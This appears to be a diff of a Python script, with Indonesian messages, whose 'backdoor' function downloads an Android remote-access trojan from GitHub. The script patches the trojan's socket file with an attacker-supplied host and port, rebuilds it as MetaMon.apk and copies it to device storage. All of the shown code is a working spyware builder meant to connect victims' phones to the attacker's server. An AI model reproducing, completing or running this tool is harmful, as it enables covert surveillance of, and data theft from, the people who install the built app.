@@ -30,29 +30,25 @@ def run():
 		
 def backdoor():
 	print ('[+] cleaning')
-	os.system('rm -rf tj >logs')
+	os.system('rm -rf T >logs')
 	time.sleep(2)
 	print ('[+] Mengunduh File 276kb')
 	os.system('git clone https://github.com/admstt/T')
 	textToSearch = 'host:port'
-	host = input('Host : ')
-	port = input('Port : ')
-	textToReplace = str(host)+":"+str(port)
+	host = raw_input('host : ')
+	port = raw_input('port : ')
+	textToReplace = host+":"+port
 	fileToSearch  = 'T/smali/com/etechd/l3mon/IOSocket.smali'
 	tempFile = open( fileToSearch, 'r+' )
 	for line in fileinput.input( fileToSearch ):
-		if textToSearch in line :
-			print('gagal menemukan host')
-		else:
-			print('gagal menemukan file')
 		tempFile.write( line.replace( textToSearch, textToReplace ) )
 	tempFile.close()
 	print ('[+] generating backdoor')
-	os.system('apktool b tj -o MetaMon.apk')
+	os.system('rm -rf T/.git;apktool b T -o MetaMon.apk')
 	print ('[+] memindahkan File')
-	os.system('mv MetaMon.apk /sdcard/MetaMon.apk')
+	os.system('mv MetaMon.apk /sdcard/MetaMon.apk >logs')
 	print ('[*] cleaning')
-	os.system('rm -rf tj')
+	os.system('rm -rf tj > logs')
 
 def menu():
 	print ('Pilih Salah Satu Menu')
